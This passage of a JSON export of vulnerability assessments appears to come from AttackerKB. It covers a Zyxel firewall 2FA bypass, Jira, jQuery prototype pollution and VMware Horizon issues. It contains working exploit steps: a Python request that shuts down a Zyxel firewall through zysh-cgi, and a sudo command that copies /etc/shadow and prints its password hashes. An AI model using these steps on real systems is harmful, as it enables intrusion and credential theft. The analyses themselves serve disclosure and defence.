'https://192.168.1.1/cgi-bin/zysh-cgi'\r\nshell_data = { 'filter':'js2','cmd':'shutdown','write':0 }\r\nresp = sess.post(shell_url, data = shell_data, headers=headers, allow_redirects=False, verify=False)\r\n\r\nprint(resp.headers)\r\nprint(resp.text)\r\n```\r\n \r\nUsing this script against our affected test [USG Flex 100](https://www.zyxel.com/us/en/products_services/USG-FLEX-Firewall-USG-FLEX-100/) generates the following output:\r\n\r\n```\r\nalbinolobster@ubuntu:~$ python3 fdas.py \r\n{'Date': 'Sat, 16 Apr 2022 11:22:35 GMT', 'Set-Cookie': 'authtok=o+F36szSDU7Q6fPAt2ExkMkvgLZIN7YMKtFM26MRm9NckniEVqSaw1zCL7Kpt2OV; path=/; SameSite=lax', 'Location': 'ext-js/app/view/object/authmeth/twoFA/2FAVerify.html?nextpage=ext-js/index.html', 'Content-Length': '263', 'Keep-Alive': 'timeout=15, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=iso-8859-1'}\r\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n<html><head>\r\n<title>302 Found</title>\r\n</head><body>\r\n<h1>Found</h1>\r\n<p>The document has moved <a href=\"ext-js/app/view/object/authmeth/twoFA/2FAVerify.html?nextpage=ext-js/index.html\">here</a>.</p>\r\n</body></html>\r\n\r\n{'Date': 'Sat, 16 Apr 2022 11:22:35 GMT', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Keep-Alive': 'timeout=15, max=99', 'Connection': 'Keep-Alive', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html'}\r\nvar zyshdata0=[{'_image_number':'1','_model':'USG FLEX 100','_firmware_version':'V4.29(ABUH.8)','_build_date':'2021-04-09 10:49:12','_boot_status':'Standby'},{'_image_number':'2','_model':'USG FLEX 100','_firmware_version':'V5.20(ABUH.0)','_build_date':'2022-01-04 18:51:35','_boot_status':'Running'}];\r\nvar errno0=0;\r\nvar errmsg0='OK';\r\n\r\nIf you are reading this, the shutdown command failed.\r\n{'Date': 'Sat, 16 Apr 2022 11:22:35 GMT', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Keep-Alive': 'timeout=15, max=98', 'Connection': 'Keep-Alive', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html'}\r\nvar zyshdata0=[];\r\nvar errno0=0;\r\nvar errmsg0='OK';\r\n```\r\n\r\nAfter the second `OK` response, the firewall powers off, therefore demonstrating the 2fa bypass.\r\n\r\nWhen the firewall has been patched, the attacker can still issue some commands to `zysh-cgi` but it appears critical commands like `shutdown` have been disabled. Here is output against the patched firmware version 5.21:\r\n\r\n```\r\nalbinolobster@ubuntu:~$ python3 fdas.py \r\n{'Date': 'Sun, 17 Apr 2022 10:33:51 GMT', 'Set-Cookie': 'authtok=zv8CJ2l2SUbsO3FIoedxTs4i94-RdQauJEM9BzlW9PV67ttFqVLH6UhRAZwpJRQL; path=/; SameSite=lax', 'Location': 'ext-js/app/view/object/authmeth/twoFA/2FAVerify.html?nextpage=ext-js/index.html', 'Content-Length': '263', 'Keep-Alive': 'timeout=15, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=iso-8859-1'}\r\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n<html><head>\r\n<title>302 Found</title>\r\n</head><body>\r\n<h1>Found</h1>\r\n<p>The document has moved <a href=\"ext-js/app/view/object/authmeth/twoFA/2FAVerify.html?nextpage=ext-js/index.html\">here</a>.</p>\r\n</body></html>\r\n\r\n{'Date': 'Sun, 17 Apr 2022 10:33:51 GMT', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Keep-Alive': 'timeout=15, max=99', 'Connection': 'Keep-Alive', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html'}\r\nvar zyshdata0=[{'_image_number':'1','_model':'USG FLEX 100','_firmware_version':'V4.29(ABUH.8)','_build_date':'2021-04-09 10:49:12','_boot_status':'Standby'},{'_image_number':'2','_model':'USG FLEX 100','_firmware_version':'V5.21(ABUH.1)','_build_date':'2022-03-15 05:51:17','_boot_status':'Running'}];\r\nvar errno0=0;\r\nvar errmsg0='OK';\r\n\r\n{'Date': 'Sun, 17 Apr 2022 10:33:51 GMT', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Keep-Alive': 'timeout=15, max=98', 'Connection': 'Keep-Alive', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html'}\r\nvar zyshdata0=[];\r\nvar errno0=0;\r\nvar errmsg0='OK';\r\n```\r\n\r\nThe cgi script still responds with `OK` but the `shutdown` is never actually executed.\r\n\r\n## Is that it?\r\n\r\nWith such a high CVSS score, it seems anticlimactic that the vulnerability is simply a 2fa bypass. It\u2019s possible that we\u2019ve overlooked a detail but, as far as we can tell, access to `zysh-cgi` requires a valid `authtok`and the firmware patch is almost entirely focused on this two-factor authentication mechanism. Zyxel included almost no other changes in this patch (interestingly the XSS didn\u2019t get a CVE, but I believe you\u2019ll find it in `redirect.cgi`):\r\n\r\n![changes](https://raw.githubusercontent.com/jbaines-r7/attackerkb_images/main/CVE-2022-0342/changes.png)\r\n\r\nZyxel\u2019s method of disclosure does cause me to question if we\u2019ve overlooked something though. The description they provided for this issue makes it sound like a critical vulnerability. They could have easily described this as a 2fa bypass instead of an \u201cauthentication bypass\u201d, and therefore downplayed the criticality of the issue. But they didn\u2019t. Are they just playing games with useless vulnerability descriptions (sadly the norm), or is there more to this issue than we\u2019ve described? It could be that the 2fa bypass is simply a symptom of a more critical vulnerability. That wouldn\u2019t surprise me, but I also don\u2019t see it.\r\n\r\n## Conclusion\r\n\r\nIn this writeup we demonstrated an MFA bypass that was recently fixed by Zyxel firewalls. It\u2019s reasonable to assume that vulnerability, at least in part, is CVE-2022-0342. While likelihood of exploitation of this particular issue is low, there are a number of things administrators should do to protect themselves from future Zyxel firewall vulnerabilities:\r\n\r\n1. Disable remote administration on the WAN interface\r\n1. Enable automatic update\r\n1. Enable two-factor authentication on the admin account\r\n1. Schedule weekly reboots of the firewall\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "d2e1a0de-cc99-4f98-ac96-c1820c29896e",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "291036e7-241f-4917-9aa6-6e37b0e1b96f",
      "created": "2022-04-22T14:52:14.439718Z",
      "revisionDate": "2022-04-22T14:52:14.437602Z",
      "document": "On February 15, 2022, Atlassian released Jira Software [updates](https://confluence.atlassian.com/jirasoftware/issues-resolved-in-8-20-6-1114804050.html) to address CVE-2022-0540. On April 20, Atlassian finally published the CVE and released a [security advisory](https://confluence.atlassian.com/jira/jira-security-advisory-2022-04-20-1115127899.html) detailing the issue. CVE-2022-0540 is an authentication bypass issue that appears to be [improper access control](https://cwe.mitre.org/data/definitions/284.html) on some endpoints. The vulnerable code exists in Jira core, but only affects downstream \u201capps\u201d that integrate with Jira. Additionally, an app is only vulnerable if it does not take steps to independently \u201cenforce additional security checks.\u201d Jira cloud services are not affected.\r\n\r\nJira lists two of its own \u201cbundled\u201d apps as affected: *Mobile Plugin for Jira* and *Insight - Asset Management*. However, their [FAQ](https://confluence.atlassian.com/kb/faq-for-cve-2022-0540-1123193843.html) also states that *Mobile Plugin for Jira* is not exploitable due to the aforementioned additional security checks and *Insight - Asset Management* requires both authentication and special permissions to exploit it. It appears that Atlassian based their CVSS3 9.9 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L) on the *Insight - Asset Management* attack case. Although, the score seems artificially inflated by use of S:C.\r\n\r\nWhile Jira lists approximately 200 affected apps in their disclosure, we do not expect this issue to see widespread exploitation. The actual impact of the bypass is dependent on the functionality exposed by the app\u2019s vulnerable endpoint. There may be a high impact vulnerable app, but the install base of specific apps is going to be significantly smaller than the Jira install base. Coupled with the fact that this issue has been fixed for more than 2 months, and cloud services are not affected, exploitation will be spotty at best (if at all).\r\n\r\n\r\n### Helpful Links\r\n\r\n* https://confluence.atlassian.com/jira/jira-security-advisory-2022-04-20-1115127899.html\r\n* https://confluence.atlassian.com/kb/faq-for-cve-2022-0540-1123193843.html\r\n* https://jira.atlassian.com/browse/JRASERVER-73650\r\n* https://jira.atlassian.com/browse/JSDSERVER-11224\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 1,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "7f1c4a35-9857-450d-93ce-b1778e518d16",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "2e72d5aa-2dca-4b08-bd6a-1d96b2001082",
      "created": "2022-04-22T21:14:42.76841Z",
      "revisionDate": "2022-10-06T18:28:28.743877Z",
      "document": "This is a very easy to exploit issue. See the Rapid7 analysis for details.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "6884998f-b4c0-4123-8c7b-f5f0fbfbb25f",
      "editorId": "ecf02638-b76a-4f50-afc2-a3de43e1b79c",
      "topicId": "cc19855a-7936-4652-9475-73d985a9e2e1",
      "created": "2022-04-23T09:34:03.789457Z",
      "revisionDate": "2022-04-23T09:34:03.78872Z",
      "document": "An open source audio codec developed by Apple is affected by serious vulnerabilities that have been pushed to millions of Android devices by some of the world\u2019s largest mobile chipset manufacturers.\r\nThe Apple Lossless Audio Codec (ALAC) was introduced by Apple in 2004 and, in 2011, the tech giant decided to make ALAC open source. The open source ALAC code has been picked up by many other vendors for non-Apple devices.\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "47fd8e97-48c9-4cf2-9c44-813beaad59b5",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "3191ccf9-da8e-43df-8152-1e3a5d1a3c45",
      "created": "2022-05-02T22:32:59.208341Z",
      "revisionDate": "2022-05-06T14:35:35.794368Z",
      "document": "With publicly available information, this was super trivial to exploit! In [the Rapid7 analysis](https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954/rapid7-analysis), I chained it together with what I thought was [CVE-2022-22960](https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22960) (I'm not sure it was anymore) to go from unauthenticated HTTPS access to root very easily.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e5979e2a-3bc4-4595-a64c-75d619201e3a",
      "editorId": "7f25e6a2-9ee4-4a34-be08-6c3b0a8c9086",
      "topicId": "12497ecd-6565-46db-ad65-2f25827c7711",
      "created": "2022-05-03T07:06:47.226974Z",
      "revisionDate": "2022-05-03T07:06:47.226723Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ef31e899-1f4f-4a1a-a259-d3a13c020752",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "ac40bba2-cfab-4459-8655-fb0d0793a572",
      "created": "2022-05-04T22:42:08.292744Z",
      "revisionDate": "2022-07-27T16:36:42.921816Z",
      "document": "Super underwhelming, IMO - requires a confluence of bad configuration. Microsoft's claims that they see vulnerable configurations in the wild are dubious - it takes some effort to make yourself vulnerable (I just used `sudo` to run as the networkd user, but that's cheating). Definitely not a name-worthy vulnerability!",
      "score": 3,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "65ce3c75-9b0e-490e-9da7-b9ba5e6c63a1",
      "editorId": "92cc908f-ddd9-49f9-9241-99865614d1dd",
      "topicId": "84f3b5a8-d839-4f1a-9130-a0c5d4b74057",
      "created": "2022-05-05T20:36:47.81298Z",
      "revisionDate": "2022-05-10T21:22:38.356893Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8d4a182a-9840-4f3c-b146-3ad36f054b4e",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "84f3b5a8-d839-4f1a-9130-a0c5d4b74057",
      "created": "2022-05-10T21:02:00.764248Z",
      "revisionDate": "2022-05-17T23:01:54.12979Z",
      "document": "The patch was difficult to analyze, due to the sheer amount of code and changes. But once Horizon3 released a PoC, tracking down the root cause and analyzing what's going on was much easier. Cheers!",
      "score": 6,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "48bb0814-aaa2-4540-9677-2c2163fa4cd4",
      "editorId": "d8c8480d-891a-4357-a086-25351dae6598",
      "topicId": "0a065587-d7de-4680-8c87-7e1c998210bc",
      "created": "2022-05-12T13:49:04.52652Z",
      "revisionDate": "2022-06-01T17:43:34.039479Z",
      "document": "This vulnerability is an easy to exploit unauthenticated and remote OS command injection vulnerability. Please see the Rapid7 analysis for details.",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fc16f4d6-55aa-460f-87bb-f1f179e0f81f",
      "editorId": "bc4008b3-dc2e-45ba-af2d-e2526eb73173",
      "topicId": "5c46e63b-643e-4656-b654-4fba061ecf66",
      "created": "2022-05-16T07:23:56.335089Z",
      "revisionDate": "2022-07-31T12:15:16.452875Z",
      "document": "I don't know what kind of expression is officially used, but it is a vulnerability that can change common objects.\r\n\r\nWhen I tried it on the console, it became as follows.\r\n\r\nPrepare the variables of test1 and test2, and assign the character string to the test of \"__proto__\" of test1.\r\n\r\nThen, test2 will also display the character string assigned to test1.\r\n\r\n\r\nI don't know what the specifications are, but the same phenomenon occurs when using \"__proto__\" for the elements of the array.\r\n\r\nIf you assign {\u201cadmin\u201d: 123456} to test [\u201c__ proto__\u201d], the admin property will be created in test, and only the assigned value will be entered (123456 in this example).\r\n\r\nIf you assign {\u201cuser\u201d: 999999} to test [\u201cuser\u201d], the user property will be created in test, and the assigned JSON itself will be entered.\r\n\r\n\r\n\r\n-------------------------------------------------------+\r\nImpact\r\nExisting properties may be added or modified.\r\n\r\nAs a result, it can lead to DoS and remote code execution.\r\n\r\nAlso, changing properties can lead to logic evasion and privilege escalation.\r\n\r\n-----------------------------------------------\r\n\r\nFirst of all, I downloaded 3.3.1 and 3.4.1 to check the phenomenon.\r\n\r\nhttps://jquery.com/download/\r\n\r\nBy using the verification code in the following article, we were able to confirm the operation of the vulnerability.\r\n\r\nhttps://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/\r\n\r\nlet a = $.extend(true, {}, JSON.parse('{\"__proto__\": {\"devMode\": true}}'))\r\nconsole.log({}.devMode); \r\nThe result of console.log.\r\n\r\n3.3.1\r\n\r\ntrue\r\n3.4.1\r\n\r\nundefined\r\nConfirmation of correction points\r\nSince I was able to confirm the operation, I decided to confirm the correction points.\r\n\r\n\r\nAs I noticed, verification was added to see if the name was \"__proto__\".\r\n\r\nWhen I tried removing this validation, prototype pollution occurred.\r\n\r\n\r\n\r\n\r\nI'm not familiar with javascript, so I can't understand what I'm doing just by reading the source code.\r\n\r\nLet's actually look at the data handled in the process.\r\n\r\nSince I was checking the contents of \"name\", let's see what the name is.\r\n\r\n\r\n\r\nA lot came out.\r\n\r\nAfter a little research, it looks like a jQuery function.\r\n\r\n\"__Proto__\" is also included.\r\n\r\nSince name contains \"__proto__\", look for the place where you are using name as an element of the array and assigning it.\r\n\r\nSince there were two places, I set console.log.\r\n\r\n\r\n\r\nThe results came out messed up so I filtered it.\r\n\r\nIt was the first place that used \"__proto__\".\r\n\r\nI made a pinpoint fix to show devMode and the content was nicely displayed.\r\n\r\n\r\n\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 2,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        }
      ]
    },
    {
      "id": "05b132a3-a52b-4e99-b9c4-983567926188",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "e9e37dea-1d1b-46c0-afd6-7a57b9d752cc",
      "created": "2022-05-17T11:52:44.831102Z",
      "revisionDate": "2022-05-23T21:21:17.178467Z",
      "document": "## [CVE-2022-29110](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29110)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/2022/CVE-2022-29110/Docs/Screenshot%202022-05-13%20165200.png)\r\n\r\n## Description:\r\nThe Microsoft 365 version 2204-Build-15128.20178 is vulnerable to RCE.\r\nThe malicious attacker can share a malicious .docm file in some of the internal or external networks by using an FTP malicious server and he can infect all computers in this network. The infected user can visit a very dangerous website and when he clicks it he can execute a bunch of javascript malicious codes or can execute a dangerous local code! Also, the malicious author can use a USB flash memory to infect every computer by using Microsoft 365 software. \r\n\r\n\r\n## Known Affected Software\r\n```\r\nVendor \tProduct \tVersion\r\nMicrosoft \tMicrosoft_Excel\t2016 (32-bit edition)\r\nMicrosoft \tMicrosoft_Excel\t2016 (64-bit edition)\r\nMicrosoft \tMicrosoft_Excel\t2013 RT Service Pack 1\r\nMicrosoft \tMicrosoft_Excel\t2013 Service Pack 1 (32-bit editions)\r\nMicrosoft \tMicrosoft_Excel\t2013 Service Pack 1 (64-bit editions)\r\nMicrosoft \tMicrosoft_Office_Web_Apps\tServer 2013 Service Pack 1\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/tree/main/2022/CVE-2022-29110)\r\n\r\n## Proof and Exploit\r\n[href](https://streamable.com/rm9hy9)",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "dbc2177e-fdc4-4013-81a1-8911a9c4c65c",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "959b5bd6-9496-432c-ad1f-db90cb01c12d",
      "created": "2022-05-23T13:41:22.646219Z",
      "revisionDate": "2022-05-23T13:41:47.002366Z",
      "document": "There exists a vulnerability within `/usr/local/horizon/scripts/publishCaCert.hzn` where a local attacker can invoke the script to make any file world-readable. The script is intended to facilitate certificate management, allowing cert files to be copied into `/etc/ssl/certs` which is owned by root. The script can be invoked by the `horizon` user without a sudo password.\r\n\r\nThe script takes two arguments, the first a path to the file to copy, the second the name of the file to write to the destination. The source path argument can be any file, but the destination is only the final component of the path meaning the file will be placed in `/etc/ssl/certs`.\r\n\r\nA local user running as `horizon` (such as from successfully exploiting [CVE-2022-22954](https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954)) can exploit this vulnerability to recover the shadow file by executing:\r\n\r\n```\r\nhorizon [ /tmp ]$ sudo /usr/local/horizon/scripts/publishCaCert.hzn /etc/shadow shadow; cat /etc/ssl/certs/shadow\r\nroot:$6$Y49xfSabYZeOAAKr$VN0QQ5IsF1swmo7PmW7SMwFpdxo.RuN2W1FEc/gF814JhnC/KU.FEBMVxDx5aRclwcfp8OYjFqzqNxtb3hQPz.:19131:0:60:7:::\r\nbin:x:18964:0:60:7:::\r\ndaemon:x:18964:0:60:7:::\r\nmessagebus:x:18964:0:60:7:::\r\nsystemd-bus-proxy:x:18964:0:60:7:::\r\nsystemd-journal-gateway:x:18964:0:60:7:::\r\nsystemd-journal-remote:x:18964:0:60:7:::\r\nsystemd-journal-upload:x:18964:0:60:7:::\r\nsystemd-network:x:18964:0:60:7:::\r\nsystemd-resolve:x:18964:0:60:7:::\r\nsystemd-timesync:x:18964:0:60:7:::\r\nnobody:x:18964:0:60:7:::\r\nsshd:!:18964:0:60:7:::\r\nrabbitmq:!:18964::60::::\r\nnamed:!:18964::60::::\r\npostgres:!:18964:0:60:7:::\r\nhorizon:!:18964:0:60:7:::\r\nsshuser:$6$1ppozTLmRlrslppH$8XxgQXUSOc.zUBTOkXFdaNR4Cmd2rPhyioLIQ.fiyvdIlMXGvpOWprt8JTZ12NOP1My2xqJpqewfP/BYLqvul1:18964:0:60:7:::\r\nelasticsearch:!:18964::60::::\r\n```\r\n\r\n# Detection\r\nThe file that is written to the `/etc/ssl/certs` directory will still be owned by root making the attacker unable to delete it. A crafty attacker would backup an existing certificate file or create a new one, leak the file of their choosing and then overwrite it again with a legitimate certificate to remove the evidence of their leaked file. Users should look for files out of place in this directory, and inspect timestamps and the certificate contents to identify potential exploitation attempts of this vulnerability.\r\n\r\n# Remediation\r\nVMWare patched this issue with hotfix [HW-154129](https://kb.vmware.com/s/article/88099). The patch for the affected script adds validation to ensure that the argument is a certificate file.\r\n\r\nDiff:\r\n```\r\n< . /usr/local/horizon/scripts/hzn-bin.inc\r\n< openssl x509 -noout -in $CERTFILE 2>/dev/null\r\n< \r\n< if [ $? -ne 0 ]; then\r\n<   echo \"ERROR: This is not a certificate file\"\r\n<   exit 1\r\n< fi\r\n<\r\n```",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "45464453-d464-48d7-ac93-62d5ccc1604b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "2bbffc82-b69b-4a49-9b90-a6e5c745141f",
      "created": "2022-05-26T18:14:14.487259Z",
      "revisionDate": "2022-06-01T17:42:43.302363Z",
      "document": "By setting the `Host` HTTP header to point to a server under an attacker's control, the target application can be made to issue an authentication request to it. By having the server respond with an HTTP 200 to any POST request, an attacker can bypass authentication and login as any user.",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
